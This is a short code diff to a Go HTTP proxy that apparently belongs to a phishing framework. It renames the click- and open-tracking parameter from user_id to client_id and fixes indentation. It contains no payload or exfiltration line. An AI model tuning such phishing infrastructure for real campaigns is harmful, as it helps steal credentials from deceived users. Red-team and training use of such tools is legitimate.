@@ -171,8 +171,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             // Handle clicked link and email opened events
             rid := ""
             browser := map[string]string{}
-            ridr, _ := regexp.Compile(`user_id=([^\"]*)`)
-            trackr, _ := regexp.Compile(`track\?user_id=`)
+            ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
+            trackr, _ := regexp.Compile(`track\?client_id=`)
             rid_match := ridr.FindString(req_url)
             opened_match := trackr.FindString(req_url)
             //log.Debug("Track regex", trackr.FindString(req_url))
@@ -197,7 +197,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
             //parts := strings.SplitN(req.RemoteAddr, ":", 2)
             //remote_addr := parts[0]
-			remote_addr := req.Header.Get("X-Forwarded-For")
+            remote_addr := req.Header.Get("X-Forwarded-For")
 
             phishDomain, phished := p.getPhishDomain(req.Host)
             if phished {
